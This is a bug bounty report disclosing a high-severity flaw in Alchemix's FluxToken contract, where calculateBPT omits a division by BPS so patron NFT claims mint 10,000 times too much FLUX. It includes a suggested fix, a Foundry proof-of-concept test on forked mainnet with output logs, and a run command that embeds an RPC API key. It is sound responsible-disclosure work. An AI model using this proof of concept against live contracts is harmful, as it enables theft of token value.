# 31380 - \[SC - High] FluxTokencalculateBPT uses wrong algorithm caus...

Submitted on May 17th 2024 at 19:31:09 UTC by @yttriumzz for [Boost | Alchemix](https://immunefi.com/bounty/alchemix-boost/)

Report ID: #31380

Report type: Smart Contract

Report severity: High

Target: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/FluxToken.sol>

Impacts:

* Theft of unclaimed yield

## Description

## Brief/Intro

The `FluxToken` contract allows users to mint some $FLUX at once using AlchemechNFT or AlEthNFT. The number of mint is calculated based on the `tokenData` of the NFT. However, `FluxToken.calculateBPT` does not divide by `BPS` resulting in the number of mint being 10000 times larger than expected.

## Vulnerability Details

Please look at the following code. The `getClaimableFlux` function is used to calculate the number of mint. It calls the `calculateBPT` function.

```solidity
///// https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/FluxToken.sol#L215-L216
    function getClaimableFlux(uint256 _amount, address _nft) public view returns (uint256 claimableFlux) {
        uint256 bpt = calculateBPT(_amount);
```

Let's look at the `calculateBPT` function, which multiplies `_amount` by `bptMultiplier`.

```solidity
///// https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/FluxToken.sol#L232-L234
    function calculateBPT(uint256 _amount) public view returns (uint256 bptOut) {
        bptOut = _amount * bptMultiplier;
    }
```

According to the comment of the `bptMultiplier` variable, it should represent `0.4%`. So, multiplied by `bptMultiplier` should be divided by `BPS (10000)`

```solidity
///// https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/FluxToken.sol#L43-L44
    /// @notice The ratio of FLUX patron NFT holders receive (.4%)
    uint256 public bptMultiplier = 40;
```

Note: The two divisions by `BPS` in the `getClaimableFlux` function correspond to the following variables, which have nothing to do with `bptMultiplier`.

* `fluxPerVe`: 5000 represents 50%
* `alchemechMultiplier`: 5 represents 0.05%

**Suggested fix**

```diff
    function calculateBPT(uint256 _amount) public view returns (uint256 bptOut) {
-       bptOut = _amount * bptMultiplier;
+       bptOut = _amount * bptMultiplier / BPS;
    }
```

## Impact Details

Users can get 10,000 times more $FLUX than expected

## References

None

## Proof of concept

The PoC patch

```diff
diff --git a/src/test/FluxToken.t.sol b/src/test/FluxToken.t.sol
index 22876a9..fb45d52 100644
--- a/src/test/FluxToken.t.sol
+++ b/src/test/FluxToken.t.sol
@@ -250,4 +250,18 @@ contract FluxTokenTest is BaseTest {
         assertEq(unclaimedFlux1End, 0, "should have no unclaimed flux");
         assertEq(unclaimedFlux2End, totalAmount, "should have all unclaimed flux");
     }
+
+    function testYttriumzzPocTemp() external {
+        uint256 patronNFTId = 4;
+        address patronNFTOwner = IAlEthNFT(patronNFT).ownerOf(patronNFTId);
+
+        console.log("tokenData of patronNFT: %s", IAlEthNFT(patronNFT).tokenData(patronNFTId));
+
+        uint256 fluxBalanceBefore = flux.balanceOf(patronNFTOwner);
+
+        hevm.prank(patronNFTOwner);
+        flux.nftClaim(patronNFT, patronNFTId);
+
+        console.log("Get $FLUX: %s", flux.balanceOf(patronNFTOwner) - fluxBalanceBefore);
+    }
 }
```

Run the PoC

```bash
FOUNDRY_PROFILE=default forge test --fork-url https://eth-mainnet.alchemyapi.io/v2/VFefkgjj8h3SgRYcCvmtp9KoMJJij6gD --fork-block-number 17133822 -vvv --match-test testYttriumzzPocTemp
```

The log

```bash
$ FOUNDRY_PROFILE=default forge test --fork-url https://eth-mainnet.alchemyapi.io/v2/VFefkgjj8h3SgRYcCvmtp9KoMJJij6gD --fork-block-number 17133822 -vvv --match-test testYttriumzzPocTemp
[⠊] Compiling...
No files changed, compilation skipped

Ran 1 test for src/test/FluxToken.t.sol:FluxTokenTest
[PASS] testYttriumzzPocTemp() (gas: 118155)
Logs:
  tokenData of patronNFT: 249991869582520600
  Get $FLUX: 7499756087469342000

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 14.90ms (889.67µs CPU time)

Ran 1 test suite in 792.98ms (14.90ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

The `tokenData` of the NFT is `0.24999186958252062`, and the mint $FLUX is `7.499756087469342`.
